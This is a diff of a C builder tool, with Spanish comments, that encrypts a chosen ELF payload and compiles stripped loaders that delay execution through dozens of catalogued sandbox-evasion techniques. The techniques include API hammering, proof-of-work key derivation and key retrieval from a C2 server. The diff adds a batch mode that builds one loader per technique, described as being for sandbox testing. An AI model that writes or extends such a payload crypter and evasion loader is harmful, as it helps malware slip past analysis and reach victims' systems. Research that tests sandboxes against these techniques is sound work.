@@ -9,6 +9,10 @@
 
 #define MAX_STAGES 5
 
+/* ========================================================================= */
+/* 1. FUNCIONES AUXILIARES Y MENÚ DE TÉCNICAS (INTERACTIVO)                 */
+/* ========================================================================= */
+
 // Helper function to verify the existence of a target file on the file system
 static int file_exists(const char *filename) {
     struct stat buffer;
@@ -43,8 +47,8 @@ static int select_evasion_technique(void) {
                 printf("    1) Hash Chain Iteration        (ID: 101)\n");
                 printf("    2) Floating Point Math         (ID: 102)\n");
                 printf("    3) Compression Spam (Zlib)     (ID: 103)\n");
-                printf("    4) Prime Number Calculation (ID: 104)\n");
-                printf("    5) Bitwise Logic Operations (ID: 105)\n");
+                printf("    4) Prime Number Calculation    (ID: 104)\n");
+                printf("    5) Bitwise Logic Operations    (ID: 105)\n");
                 printf("    6) Recursive Fibonacci         (ID: 106)\n");
                 printf("    7) Junk Logic & Opcodes        (ID: 107)\n");
                 printf("    8) Proof-of-Work Delay         (ID: 108)\n");
@@ -56,14 +60,14 @@ static int select_evasion_technique(void) {
 
             case 2:
                 printf("\n    --- FAMILY 2: NETWORK ---\n");
-                printf("    1) TCP Socket Timeout         (ID: 201)\n");
-                printf("    2) DNS Lookup Spam            (ID: 202)\n");
-                printf("    3) Raw HTTP Request           (ID: 203)\n");
-                printf("    4) Passive UDP Receive        (ID: 204)\n");
-                printf("    5) External NTP Sync Check    (ID: 205)\n");
-                printf("    6) Network Garbage Flood      (ID: 206)\n");
-                printf("    7) Reverse DNS Resolution     (ID: 207)\n");
-                printf("    8) External C2 Key Retrieval  (ID: 208)\n");
+                printf("    1) TCP Socket Timeout          (ID: 201)\n");
+                printf("    2) DNS Lookup Spam             (ID: 202)\n");
+                printf("    3) Raw HTTP Request            (ID: 203)\n");
+                printf("    4) Passive UDP Receive         (ID: 204)\n");
+                printf("    5) External NTP Sync Check     (ID: 205)\n");
+                printf("    6) Network Garbage Flood       (ID: 206)\n");
+                printf("    7) Reverse DNS Resolution      (ID: 207)\n");
+                printf("    8) External C2 Key Retrieval   (ID: 208)\n");
                 printf("    Selection: ");
                 if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 8) {
                     tech_id = 200 + tech_choice;
@@ -72,13 +76,13 @@ static int select_evasion_technique(void) {
 
             case 3:
                 printf("\n    --- FAMILY 3: STORAGE ---\n");
-                printf("    1) Recursive Directory Walk (ID: 301)\n");
-                printf("    2) Heavy I/O Flush (fsync)    (ID: 302)\n");
-                printf("    3) Entropy Source Wait        (ID: 303)\n");
-                printf("    4) Sparse File Allocation     (ID: 304)\n");
-                printf("    5) Directory Creation Spam    (ID: 305)\n");
-                printf("    6) Memory Pressure / Swap     (ID: 306)\n");
-                printf("    7) File Metadata Stat Queries(ID: 307)\n");
+                printf("    1) Recursive Directory Walk    (ID: 301)\n");
+                printf("    2) Heavy I/O Flush (fsync)     (ID: 302)\n");
+                printf("    3) Entropy Source Wait         (ID: 303)\n");
+                printf("    4) Sparse File Allocation      (ID: 304)\n");
+                printf("    5) Directory Creation Spam     (ID: 305)\n");
+                printf("    6) Memory Pressure / Swap      (ID: 306)\n");
+                printf("    7) File Metadata Stat Queries  (ID: 307)\n");
                 printf("    Selection: ");
                 if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
                     tech_id = 300 + tech_choice;
@@ -87,13 +91,13 @@ static int select_evasion_technique(void) {
 
             case 4:
                 printf("\n    --- FAMILY 4: SYNCHRONIZATION ---\n");
-                printf("    1) Thread Join Wait          (ID: 401)\n");
-                printf("    2) Work Queue Blocking        (ID: 402)\n");
-                printf("    3) IPC Pipe Wait              (ID: 403)\n");
-                printf("    4) POSIX Semaphore Race       (ID: 404)\n");
-                printf("    5) Event Condition Wait       (ID: 405)\n");
-                printf("    6) Thread Barrier Point       (ID: 406)\n");
-                printf("    7) Condition Var Broadcast    (ID: 407)\n");
+                printf("    1) Thread Join Wait            (ID: 401)\n");
+                printf("    2) Work Queue Blocking         (ID: 402)\n");
+                printf("    3) IPC Pipe Wait               (ID: 403)\n");
+                printf("    4) POSIX Semaphore Race        (ID: 404)\n");
+                printf("    5) Event Condition Wait        (ID: 405)\n");
+                printf("    6) Thread Barrier Point        (ID: 406)\n");
+                printf("    7) Condition Var Broadcast     (ID: 407)\n");
                 printf("    Selection: ");
                 if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
                     tech_id = 400 + tech_choice;
@@ -102,13 +106,13 @@ static int select_evasion_technique(void) {
 
             case 5:
                 printf("\n    --- FAMILY 5: TEMPORAL ---\n");
-                printf("    1) Standard sleep() Call      (ID: 501)\n");
-                printf("    2) Empty select() Timeout     (ID: 502)\n");
-                printf("    3) High-Res nanosleep()       (ID: 503)\n");
-                printf("    4) Signal Alarm & Pause       (ID: 504)\n");
-                printf("    5) Subprocess Sleep Wait      (ID: 505)\n");
-                printf("    6) System ppoll() Wait        (ID: 506)\n");
-                printf("    7) Interval setitimer()       (ID: 507)\n");
+                printf("    1) Standard sleep() Call       (ID: 501)\n");
+                printf("    2) Empty select() Timeout      (ID: 502)\n");
+                printf("    3) High-Res nanosleep()        (ID: 503)\n");
+                printf("    4) Signal Alarm & Pause        (ID: 504)\n");
+                printf("    5) Subprocess Sleep Wait       (ID: 505)\n");
+                printf("    6) System ppoll() Wait         (ID: 506)\n");
+                printf("    7) Interval setitimer()        (ID: 507)\n");
                 printf("    Selection: ");
                 if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
                     tech_id = 500 + tech_choice;
@@ -117,8 +121,8 @@ static int select_evasion_technique(void) {
 
             case 6:
                 printf("\n    --- FAMILY 6: HAMMERING ---\n");
-                printf("    1) System API Hammering       (ID: 601)\n");
-                printf("    2) Memory Allocation Hammer   (ID: 602)\n");
+                printf("    1) System API Hammering        (ID: 601)\n");
+                printf("    2) Memory Allocation Hammer    (ID: 602)\n");
                 printf("    Selection: ");
                 if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 2) {
                     tech_id = 600 + tech_choice;
@@ -139,12 +143,156 @@ static int select_evasion_technique(void) {
     }
 }
 
+/* ========================================================================= */
+/* 2. ESTRUCTURA Y LÓGICA DE GENERACIÓN EN LOTE (BATCH)                      */
+/* ========================================================================= */
+
+typedef struct {
+    int tech_id;
+    const char *tech_name;
+    const char *family;
+    int param; 
+} batch_technique_t;
+
+static const batch_technique_t BATCH_CATALOG[] = {
+    {101, "delay_hash_chain",       "Compute",         5000000},
+    {102, "delay_float_math",        "Compute",         100000000},
+    {103, "delay_compression_spam", "Compute",         50000},
+    {104, "delay_prime_calc",        "Compute",         10000000},
+    {105, "delay_bitwise_ops",      "Compute",         1000000000},
+    {106, "delay_recursive_fib",    "Compute",         42},
+    {107, "delay_junk_logic",        "Compute",         100000000},
+    {108, "pow_evasion",             "Compute/PoW",     1}, // Dificultad PoW
+
+    {201, "delay_tcp_timeout",      "Network",         600},
+    {202, "delay_dns_lookup_spam", "Network",         10000},
+    {203, "delay_http_request",    "Network",         600},
+    {204, "delay_udp_recv",         "Network",         600},
+    {205, "delay_ntp_sync_check",  "Network",         600},
+    {206, "delay_network_garbage", "Network",         50000},
+    {207, "delay_reverse_dns",     "Network",         5000},
+    {208, "c2_key_retrieval",     "Network",         0},
+    {301, "delay_disk_walk",        "Storage",         100000},
+    {302, "delay_heavy_io_blips",  "Storage",         50000},
+    {303, "delay_entropy_source",  "Storage",         1000000},
+    {304, "delay_sparse_file_bomb","Storage",         10000},
+    {305, "delay_mkdir_spam",      "Storage",         50000},
+    {306, "delay_memory_pressure", "Storage",         1024},
+    {307, "delay_metadata_stat",   "Storage",         500000},
+
+    {401, "delay_thread_join",      "Synchronization", 600},
+    {402, "delay_queue_blocking",  "Synchronization", 600},
+    {403, "delay_pipe_wait",        "Synchronization", 600},
+    {404, "delay_semaphore_race",  "Synchronization", 1000000},
+    {405, "delay_event_wait",      "Synchronization", 600},
+    {406, "delay_barrier",         "Synchronization", 600},
+    {407, "delay_condition_var",   "Synchronization", 600},
+
+    {501, "sleep_standard",        "Temporal",        6000},
+    {502, "sleep_select",          "Temporal",        6000},
+    {503, "sleep_nanosleep",       "Temporal",        6000},
+    {504, "sleep_signal",          "Temporal",        6000},
+    {505, "sleep_subprocess_wait", "Temporal",        6000},
+    {506, "sleep_ppoll",           "Temporal",        6000},
+    {507, "sleep_itimer",          "Temporal",        6000},
+
+    {601, "execute_api_hammering", "Hammering",       1000000},
+    {602, "memory_hammering",      "Hammering",       500000}
+};
+
+static const int BATCH_CATALOG_SIZE = sizeof(BATCH_CATALOG) / sizeof(BATCH_CATALOG[0]);
+
+static void execute_batch_mode(void) {
+    char elf_path[256];
+    char key_input[64];
+    StageConfig batch_stage;
+    char compile_cmd[512];
+
+    printf("\n=====================================================\n");
+    printf("        BATCH GENERATION: ALL TECHNIQUES TEST        \n");
+    printf("=====================================================\n\n");
+
+    do {
+        printf("Path to target ELF binary (e.g., ./payloads/stage1.elf): ");
+        scanf("%255s", elf_path);
+
+        if (!file_exists(elf_path)) {
+            printf("    [!] ERROR: File '%s' does not exist. Please try again.\n", elf_path);
+        }
+    } while (!file_exists(elf_path));
+
+    printf("Enter Passphrase / Seed string for ALL stage encryptions: ");
+    scanf("%63s", key_input);
+
+    system("mkdir -p dist_batch");
+
+    printf("\n[+] Starting compilation of %d individual technique loaders...\n\n", BATCH_CATALOG_SIZE);
+
+    for (int i = 0; i < BATCH_CATALOG_SIZE; i++) {
+        const batch_technique_t tech = BATCH_CATALOG[i];
+        memset(&batch_stage, 0, sizeof(StageConfig));
+
+        // Configuración básica del payload
+        strncpy(batch_stage.elf_path, elf_path, sizeof(batch_stage.elf_path));
+        strncpy(batch_stage.key_input, key_input, sizeof(batch_stage.key_input));
+        batch_stage.exec_mode = 1;
+
+        // Configuración de red por defecto
+        strncpy(batch_stage.net_ip, "192.0.2.1", sizeof(batch_stage.net_ip));
+        strncpy(batch_stage.net_host, "nonexistent.test", sizeof(batch_stage.net_host));
+        strncpy(batch_stage.net_path, "/", sizeof(batch_stage.net_path));
+        batch_stage.net_port = 80;
+
+        // Asignación de parámetros de la técnica
+        batch_stage.tech_id = tech.tech_id;
+        batch_stage.tech_param = tech.param;
+        batch_stage.pow_difficulty = tech.param;
+
+        // Selección del modo de derivación de clave según la técnica
+        if (tech.tech_id == 108) {
+            batch_stage.key_derivation_mode = 2; // PoW Evasion
+        } else if (tech.tech_id == 208) {
+            batch_stage.key_derivation_mode = 3; // Remote C2 Retrieval
+        } else {
+            batch_stage.key_derivation_mode = 1; // Standard Key Derivation
+        }
+
+        printf("[%2d/%d] Building: %-25s (ID: %d)\n", 
+               i + 1, BATCH_CATALOG_SIZE, tech.tech_name, tech.tech_id);
+
+        if (run_builder(&batch_stage, 1) != 0) {
+            fprintf(stderr, "  [-] Error generating payload.h for %s\n", tech.tech_name);
+            continue;
+        }
+
+        snprintf(compile_cmd, sizeof(compile_cmd),
+            "gcc -Wall -O2 -s -Iinclude "
+            "-ffunction-sections -fdata-sections "
+            "-fvisibility=hidden "
+            "loader.c "
+            "-o dist_batch/loader_%s.elf "
+            "-Wl,--gc-sections -lcrypto -lssl -lpthread -lm -lz -w",
+            tech.tech_name);
+
+        int status = system(compile_cmd);
+
+        if (status != 0) {
+            fprintf(stderr, "  [-] GCC Compilation error on %s\n", tech.tech_name);
+        }
+    }
+
+    printf("\n[✓] Batch generation completed! All binaries saved to: ./dist_batch/\n\n");
+}
+
+/* ========================================================================= */
+/* 3. PUNTO DE ENTRADA PRINCIPAL                                             */
+/* ========================================================================= */
+
 int main(void) {
     int mode_choice = 0;
     int total_stages = 0;
     StageConfig stages[MAX_STAGES];
 
-    // Initialize the stage configuration array to zero
     memset(stages, 0, sizeof(stages));
 
     printf("=====================================================\n");
@@ -154,10 +302,16 @@ int main(void) {
     printf("Select target binary structure:\n");
     printf("    1) Single Stage (1 Encrypted ELF + 1 Evasion Technique)\n");
     printf("    2) Multi-Stage  (N Chained ELFs with Derived Keys)\n");
+    printf("    3) Batch Mode   (Generate 1 Binary per Technique for Sandbox Testing)\n");
     printf("  Option: ");
-    if (scanf("%d", &mode_choice) != 1 || (mode_choice != 1 && mode_choice != 2)) {
+    if (scanf("%d", &mode_choice) != 1 || (mode_choice < 1 || mode_choice > 3)) {
         fprintf(stderr, "[-] Invalid option.\n");
         return EXIT_FAILURE;
+    }
+
+    if (mode_choice == 3) {
+        execute_batch_mode();
+        return EXIT_SUCCESS;
     }
 
     if (mode_choice == 1) {
@@ -170,7 +324,6 @@ int main(void) {
         }
     }
 
-    // Configure parameters for each deployment stage interactively
     for (int i = 0; i < total_stages; i++) {
         strncpy(stages[i].net_ip, "127.0.0.1", sizeof(stages[i].net_ip));
         strncpy(stages[i].net_host, "localhost", sizeof(stages[i].net_host));
@@ -196,17 +349,15 @@ int main(void) {
         stages[i].tech_id = select_evasion_technique();
 
         if (stages[i].tech_id == 108) {
-            // --- PROOF OF WORK MODE ---
             stages[i].key_derivation_mode = 2;
             printf("Enter PoW Difficulty bits: ");
             scanf("%d", &stages[i].pow_difficulty);
             stages[i].tech_param = stages[i].pow_difficulty;
 
         } else if (stages[i].tech_id == 208) {
-            // --- EXTERNAL C2 KEY RETRIEVAL MODE ---
             stages[i].key_derivation_mode = 3;
             stages[i].pow_difficulty = 0;
-            stages[i].tech_param = 0; // No time parameter required; waiting loop is governed by network response
+            stages[i].tech_param = 0;
 
             printf("[NETWORK C2] Enter C2 Hostname/Domain/IP (e.g., c2.example.com): ");
             scanf("%127s", stages[i].net_host);
@@ -218,7 +369,6 @@ int main(void) {
             scanf("%63s", stages[i].net_path);
 
         } else {
-            // --- STANDARD / LOCAL STATIC DERIVATION MODE ---
             stages[i].key_derivation_mode = 1;
             stages[i].pow_difficulty = 0;
 
@@ -273,7 +423,6 @@ int main(void) {
     printf("\n=====================================================\n");
     printf("Generating payload.h with %d stage(s)...\n", total_stages);
     
-    // Invoke the builder module to compile configurations and encrypt payloads
     if (run_builder(stages, total_stages) != 0) {
         fprintf(stderr, "[-] Error during Builder generation process.\n");
         return EXIT_FAILURE;
@@ -283,7 +432,6 @@ int main(void) {
     printf("Compiling final Loader...\n");
     system("mkdir -p dist");
 
-    // Compilation flags for optimization, hardening, and dead-code stripping
     const char *compile_cmd = 
         "mkdir -p dist && "
         "gcc -Wall -O2 -s -Iinclude "
@@ -304,4 +452,4 @@ int main(void) {
     }
 
     return EXIT_SUCCESS;
-}
+}
